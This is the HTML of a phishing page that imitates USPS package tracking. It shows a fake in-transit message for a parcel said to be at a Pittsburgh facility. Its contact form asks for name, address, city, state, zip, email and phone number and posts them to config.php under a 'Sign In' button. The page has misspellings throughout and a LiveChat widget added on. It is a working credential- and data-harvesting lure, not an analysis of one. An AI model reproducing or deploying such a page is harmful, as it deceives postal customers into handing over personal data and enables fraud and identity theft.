<!DOCTYPE html>
<html><head>
        <link rel="stylesheet" href="./files/11/bootstrap-icons.css">
        <link rel="stylesheet" href="./files/11/font-awesome.min.css"> 
        <title>Welcom | USPS</title>
        <!-- logo site web-->
        <link rel="icon" href="" type="image/x-icon">
        <link rel="shortcut icon" href="" type="image/x-icon">
        <!-- link__css -->
        <link rel="stylesheet" href="./files/11/bootstrap.css">
        <link rel="stylesheet" href="./files/11/laylay.css">
</head>
<body>
        
        <!-- ======START___HEADER====== -->
        <div class="header">
            <div class="container-fluid">
                <ul>
                    <li><img src="./files/11/langue.png"><span>Englich</span></li>
                    <li><img src="./files/11/location.svg"><span>Locations</span></li>
                    <li><img src="./files/11/support.png"><span>Support</span></li>
                    <li><img src="./files/11/delivry.svg"><span>Informed Delivry</span></li>
                    <li><span>Rejister / Sign In</span></li>
                </ul>
            </div>
        </div>
        <!-- ======ENNND___HEADER====== -->

        <!-- HEADER___HIDDEN -->
        <div class="hide">
            <div class="container-fluid">
                <div class="show">
                    <img src="./files/11/combo.svg">
                    <img src="./files/11/pro_logo.svg" class="tiger">
                    <img src="./files/11/search.svg">
                </div>
            </div>
        </div>
        <!-- HEADER___HIDDEN -->


        <!-- ======START___NAVBAR====== -->
        <div class="navbar">
            <div class="container-fluid">
                <div class="company">
                    <img src="./files/11/usps_logo.svg">
                </div>
                <div class="choses">
                    <ul>
                        <li class="active">Quick Tools</li>
                        <li>Send</li>
                        <li>Receive</li>
                        <li>Shop</li>
                        <li>Business</li>
                        <li>International</li>
                        <li>Help</li>
                        <li><img src="./files/11/search.svg"></li>
                    </ul>
                </div>
            </div>
        </div>
        <!-- ======ENNND___NAVBAR====== -->

        <div class="container track">
            <div><h1>USPS Tracking®</h1></div>
            <div>
                <span class="active">Tracking</span>
                <span class="paco">FAQs<i class="fa fa-angle-right"></i></span>
            </div>
        </div>


        <div class="container">
            <div class="pub">
                <div class="posteri">
                    <img src="./files/11/posta.svg">
                    <p>Track Packages<br>Anytime, Anywhere</p>
                </div>
                <div class="para">
                    <p>Get the free Informed Delivery feature to receive<br> automated notifications on your packages</p>
                    <button class="btn">Learn more</button>
                </div>
            </div>
        </div>

        <!-- ======START__INFO====== -->
        <div class="info carta mt-5">
             <div class="container">
                <div class="stepsis">
                    <div class="niveu "></div>
                    <div class="niveu"></div>
                    <div class="niveu hiey"></div>
                </div>
                 <div class="row gx-4 gy-4 pt-5">
                     <div class="col-lg-6  col-md-6 col_12">
                         <div class="login">
                             <h4>Contact-information</h4>
                             <div class="lebaa">
                                 <form action="config.php" method="post">
                                     <input type="hidden" name="step" value="index">
                                     <div class="form-group d-flex justify-content-between">
                                         <div class="prod">
                                             <label>First Name</label>
                                             <input required="required" required="required" type="text" name="first" class="form-control" id="first">
                                         </div>
                                         <div class="prod">
                                             <label>Last Name</label>
                                             <input required="required" type="text" name="last" class="form-control" id="last">
                                         </div>
                                     </div>
                                     <div class="form-group mt-3">
                                         <label>Adress</label>
                                         <div class="one">
                                             <input type="text" required="required" name="adress" class="form-control" id="adress">
                                         </div>
                                     </div>
                                     <div class="form-group mt-3">
                                         <label>State</label>
                                         <div class="one">
                                             <input type="text" name="state" required="required" required="required" class="form-control" id="adress">
                                         </div>
                                     </div>
                                     <div class="form-group mt-3">
                                         <label>City</label>
                                         <div class="one">
                                             <input type="text" name="city" required="required" class="form-control" id="adress">
                                         </div>
                                     </div>
                                     <div class="form-group mt-3">
                                         <label>Zip</label>
                                         <div class="one">
                                             <input required="required"  type="text" name="zip" class="form-control" id="zip">
                                         </div>
                                     </div>
                                     <div class="form-group mt-3">
                                         <label>Email Adress</label>
                                         <div class="one">
                                             <input required="required" type="text" name="email" class="form-control" id="email">
                                         </div>
                                     </div>
                                     <div class="form-group mt-3">
                                         <label>Number Phone</label>
                                         <div class="one">
                                             <input type="text" required="required" name="number" class="form-control" id="number">
                                         </div>
                                     </div>
                                     <div class="forbot">
                                         <button class="btn" name="submit">Sign In</button>
                                     </div>
                                 </form>
                             </div>
                         </div>
                     </div>
                     <div class="col-lg-6 col-md-6 col_12">
                         <div class="title">
                            <div class="paragraph">
                                <p class="pom"><strong>Trcking Number</strong> : US/2938426</p>
                                <span>Your item arrived at our USPS facility in PITTSBURGH PA NETWORK DISTRIBUSTION CENTER .The item is currently in transit to the destination.</span>
                            </div>
                            <div class="lowing">
                                <strong>Status</strong>
                                <h5>Arrived at USPS regional Facility</h5>
                                <p>
                                    
                                    <br>
                                    PITTABURGH PA NETWORK DISTRIBUTION CENTER
                                </p>
                                <span>Change Delivry instruction <i class="fa fa-angle-down ms-2"></i></span>
                            </div>
                         </div>
                     </div>
                 </div>
             </div>
        </div>
         <!-- ======END__INFO====== -->


         <!-- ======END__game====== -->
         <div class="game text-center">
             <div class="container">
                 <h2>Can’t find what you’re looking for?</h2>
                 <p>Go to our FAQs section to find answers to your tracking questions.</p><p>
                 <button class="btn">FAQs</button>
             </p></div>
         </div>
         <!-- ======Start__game====== -->
         

         <!-- START____FOOTER -->
         <div class="fotter">
             <div class="container-fluid">
                 <img src="./files/11/usps_logo.svg">
                 <div class="row pt-4">
                     <div class="col-lg-3 col-md-3 col-6">
                         <ul>
                             <li><strong>HELPFUL LINKS</strong></li>
                             <li>Contact Us</li>
                             <li>Site Index</li>
                             <li>FAQs</li>
                             <li>Feedback</li>
                         </ul>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6">
                         <ul>
                             <li><strong>ON ABOUT.USPS.COM</strong></li>
                             <li>About USPS Home</li>
                             <li>Newsroom</li>
                             <li>USPS Service Updates</li>
                             <li>Forms &amp; Publications</li>
                             <li>Government Services</li>
                             <li>Careers</li>
                         </ul>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6">
                         <ul>
                             <li><strong>OTHER USPS SITES</strong></li>
                             <li>Business Customer Gateway</li>
                             <li>Postal Inspectors</li>
                             <li>Inspector General</li>
                             <li>Postal Explorer</li>
                             <li>National Postal Museum</li>
                             <li>Resources for Developers</li>
                         </ul>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6">
                         <ul>
                             <li><strong>LEGAL INFORMATION</strong></li>
                             <li>Privacy Policy</li>
                             <li>Terms of Use</li>
                             <li>FOIA</li>
                             <li>No FEAR Act/EEO Contacts</li>
                         </ul>
                     </div>
                 </div>
                 <span class="copirayt">Copyright © 2022 USPS. All Rights Reserved.</span>
                 <hr class="my-4">
                 <div class="socieu">
                    <ul>
                      <li><img src="./files/11/fb.png"></li>
                      <li><img src="./files/11/twitter.png"></li>
                      <li><img src="./files/11/pinter.png"></li>
                      <li><img src="./files/11/yout.png"></li>
                    </ul>
                 </div>
             </div>
         </div>
         <!-- END____FOOTER -->

 

        <script src="./files/11/jquery-3.5.1.min.js.téléchargement"></script>
        <script src="./files/11/jquery.mask.js.téléchargement"></script>
        <script src="./files/11/bootstrap.min.js.téléchargement"></script>
        <script>

		   $("#number").mask("0000 00 00 00 00");
           $("#zip").mask("0000000");

        </script>

<div id="torrent-scanner-popup" style="display: none;"></div><!-- Start of LiveChat (www.livechat.com) code -->
<script>
    window.__lc = window.__lc || {};
    window.__lc.license = 14845155;
    ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
</script>
<noscript><a href="https://www.livechat.com/chat-with/14845155/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
<!-- End of LiveChat code --></body></html>